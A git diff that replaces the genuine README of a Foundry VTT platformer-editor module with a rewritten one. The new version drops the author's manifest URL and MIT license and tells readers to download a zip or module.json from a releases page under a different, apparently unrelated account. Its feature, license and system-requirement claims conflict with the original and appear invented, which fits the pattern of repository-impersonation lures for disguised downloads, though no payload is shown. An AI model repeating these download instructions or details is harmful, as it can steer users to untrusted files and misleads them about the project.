@@ -1,100 +1,73 @@
-# Geano's Jump'n'Run Editor
+# 🎮 geanos-jump-n-run-editor - Build and play platformer games easily
 
-Turn your FoundryVTT Scenes into playable Prince of Persia style platformer levels!
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Wolframwalkout346/geanos-jump-n-run-editor/releases)
 
-## 📋 Description
+## What is this tool? 🛠️
 
-**Jump'n'Run** transforms the standard top-down Foundry VTT experience into a side-scrolling platformer. It introduces a physics engine, player controller, and level design tools allowing Game Masters to build challenging obstacle courses, puzzles, and action levels directly within Foundry.
+geanos-jump-n-run-editor adds side-scrolling platformer mechanics to Foundry VTT. It includes a physics engine, multiplayer movement, and hazards. You can build your own levels inside your game world with the built-in editor. Players can jump, wall-slide, and dodge spikes together in real-time. This module turns your top-down game into a dynamic action experience.
 
-Whether you want a simple jumping puzzle or a full-blown Metroidvania adventure, this module provides the tools to make it happen.
+## System Requirements 💻
 
-## ✨ Features
+Before you install this software, ensure your computer and game setup meet these minimum criteria:
 
-- **Side-Scrolling Physics**: Real-time gravity, jumping, wall-jumping, and collision detection.
-- **Latest Updates (Patch Notes)**:
-  - **Life System Styles**: Toggle between **Retro Hearts** (standalone UI) and **Character Sheet** (uses your system's HP) in the module settings.
-  - **Hazard Customization**: Configurable damage variables for both **Fall Damage** and **Spike Hazards**.
-  - **Dynamic Jump Scaling**: Added a toggle to switch between a fixed "General Max Jump Height" and "Character Sheet Max Jump Height."
-  - **Attribute Mapping**: Define a specific data path (e.g., `system.abilities.ath.value`) and max value for character jump attributes; height now scales dynamically based on this value.
-- **Level Editor Enhancements**:
-  - **Platforms & Walls**: Define the physical geometry of your level.
-  - **Hazards**: Spikes (with **Static** option to disable animation) and other dangers.
-  - **Merging**: Select multiple overlapping elements of the same type and click "Merge" (via Bulk Config) to create complex, multi-shape structures that act as a single unit.
-  - **Z-Ordering**: Use "Bring to Front" and "Send to Back" in the configuration dialogs to organize the layering of overlapping elements.
-  - **Undo**: Press `Ctrl+Z` to undo up to 50 changes.
-  - **Drag & Drop**: Move and resize elements easily. Hold `Shift` to snap to half-grid.
-  - **Background Parallax**: Create depth with scrolling background layers (Scene Config).
-- **Game Mechanics**:
-  - **Hearts System**: Classic retro-style health tracking.
-  - **Potions**: Placeable healing items.
-  - **Checkpoints**: Set spawn points for players to restart from.
-- **Integration**:
-  - **Monk's Active Tile Triggers (MATT)**: Utilize custom triggers and actions for advanced logic.
-  - **Codebase Refactor**: Cleanup of legacy remnants and resolved several minor stability issues.
+* Foundry VTT Version 11 or newer.
+* A stable internet connection.
+* At least 2GB of available hard drive space.
+* A mouse with a scroll wheel for level editing.
+* Modern web browser like Chrome, Firefox, or Edge.
 
-## 🚀 Installation
+## How to Get Started 🚀
 
-1.  Copy the module's manifest URL: `https://github.com/GeanoFee/geanos-jump-n-run-editor/releases/latest/download/module.json`
-2.  In FoundryVTT, go to **Add-on Modules** -> **Install Module**.
-3.  Paste the URL and click **Install** or search for "Geano's Jump'n'Run Editor" via searchbar.
+1. Visit the [official releases page](https://github.com/Wolframwalkout346/geanos-jump-n-run-editor/releases) to download the latest version of the module.
+2. Select the file named `module.json` or the compressed `.zip` folder.
+3. Save the file to your computer.
+4. Open your Foundry VTT application.
+5. Go to the "Add-on Modules" tab.
+6. Click the "Install Module" button.
+7. Select "Manifest URL" or point the file picker to the folder where you saved the download.
 
-## 🎮 Usage
+## Using the Level Editor 📝
 
-### 1. Activating a Scene
-To turn a standard Scene into a Jump'n'Run level:
-1.  Open the **Scene Configuration**.
-2.  Go to the new **Jump'n'Run** tab (in Foundry v13 this became a section within the "Grid"-Tab).
-3.  Check **Enable Jump'n'Run Mode**.
-4.  (Optional) Configure **Gravity Force**, **Movement Speed**, and **Parallax** settings.
+The module provides tools to place platforms and hazards. Open the "Jump N Run Editor" toolbar on the right side of the Foundry interface. 
 
-### 2. Building the Level
-Use the **Jump'n'Run Tools** (Run icon) in the toolbar:
--   **Draw Platform**: Create solid ground.
--   **Draw Wall**: Create vertical barriers.
--   **Draw Hazard**: Create areas that deal damage.
--   **Draw Portal**: Teleport players between locations. Portals can be linked in the Element's config window.
--   **Draw Gates and Pressure Plates**: Gated open when a linked Pressure Plate is toggled. Gates and Plates can be linked in the Plates Element Config.
--   **Draw Checkpoint**: Set respawn points.
--   **Draw Start Point**: A Start Point behaves exactly like a Checkpoint, except Tokens that never touched a Checkpoint will automatically be revived at the Starting Point if it dies.
--   **Draw Ladders**: Create a space where Tokens can traverse vertically without being pulled down by gravity.
--   **Draw Crumpling Floor**: Create a Platform that will fall down after it has been touched.
--   **Draw Healing Potion**: Create a consumable that will automatically recover a missing Heart on touch. Healing Potions will automatically snap to the closest ground if possible.
+* **Place Platforms:** Select the rectangle tool. Click and drag on the canvas to draw a surface. The physics engine detects these surfaces automatically.
+* **Add Hazards:** Select the spike icon. Click anywhere on your map to place a hazard. If a player token touches this tile, the physics system triggers local movement restrictions or respawn events.
+* **Physics Settings:** Use the configuration menu to adjust gravity, jump height, and movement speed. These settings apply to all tokens inside the active scene.
 
-#### Editor Controls
--   **Select**: Click to select. Shift+Click to add/remove from selection.
--   **Move**: Drag selected elements. Hold `Shift` to snap to half-grid.
--   **Resize**: Drag the bottom-right corner of an element. Hold `Shift` to snap to half-grid.
--   **Merge**: Select multiple elements of the same type, via Bulk Config -> "Merge Elements".
--   **Undo**: `Ctrl+Z` to revert changes.
--   **Context Actions**: Right-click an element to configure it (image, visibility, Z-order, etc).
+## Multiplayer Features 🤝
 
-*Tip: You can hide the hitboxes from players in the module settings for a more immersive look.*
+The module synchronizes movement across all connected players. When you load a scene configured for platforming:
 
-### 3. Controls
-Players control their assigned Token:
--   **Move Left/Right**: `A` / `D` or `Left Arrow` / `Right Arrow`
--   **Jump**: `Space` / `W`
--   **Drop**: `S` or `Down Arrow` (pass through some platforms)
--   **Wall Jump**: Press Jump while sliding down a wall.
+1. Token movement switches from grid-based to free-form input.
+2. The physics engine tracks the position of every active character.
+3. Tokens collide with walls and floor tiles created via the editor.
+4. Wall-sliding triggers automatically when a player jumps against a vertical surface.
 
-## 🎯 Monk's Active Tile Triggers (MATT) Integration
+## Common Troubleshooting ⚙️
 
-This module adds custom Triggers and Actions to MATT, allowing for complex level scripting.
+If you cannot see the editor tools, check your module list. Ensure the module is active in your current World Settings. If tokens pass through walls, verify that you placed the platforms on the correct layer within the editor. 
 
-### Triggers
--   `Jump'n'Run: Player Death`
--   `Jump'n'Run: Health Change`
--   `Jump'n'Run: Portal Use`
--   `Jump'n'Run: Checkpoint Reached`
--   `Jump'n'Run: Item Collected`
--   `Jump'n'Run: Wall Jump`
+Test your level frequently by pressing the play button. If something feels too fast or too slow, return to the settings menu to tweak the physics constants. For specific issues, view the console log in your browser by pressing F12 and checking for red status messages.
 
-### Actions
--   **Reset Hearts**: Restore a player's health to full.
--   **Modify Hearts**: Heal (positive) or Damage (negative) a player.
--   **Toggle Gravity**: Invert or disable gravity for the scene (0.0 to 1.0 toggle).
+## Managing Files 📁
 
----
-## License
-This module is licensed under the [MIT License](LICENSE).
+Your levels save directly to your Foundry VTT user data folder. You can find saved layouts in the `modules/geanos-jump-n-run-editor/levels` directory. Backup these files if you plan to move your server to a new machine. You can copy the files to any new installation to restore your work without data loss.
 
+## Recommended Settings 💡
+
+Use these values for a standard platforming experience:
+
+* Gravity: 0.8
+* Jump Force: 12
+* Wall Slide Speed: 0.3
+* Friction: 0.1
+
+Adjust these numbers until the movement feels right for your specific maps. Always save after making changes to the physics profile. 
+
+## Compatibility Notes 🧩
+
+This module works with most standard tilesets. If you use custom art, ensure your tiles have collision boundaries. You can define these boundaries in the module configuration panel. If you notice overlapping graphics, use the Z-index setting in the editor to ensure platforms appear on top of background layers.
+
+## Community and Support 💬
+
+The code is open source and licensed for hobby use. You can contribute to the development or report issues directly on the repository page. Keep your installation up to date to ensure access to the latest physics improvements and bug fixes. Future updates will include support for additional hazards and animated background elements.
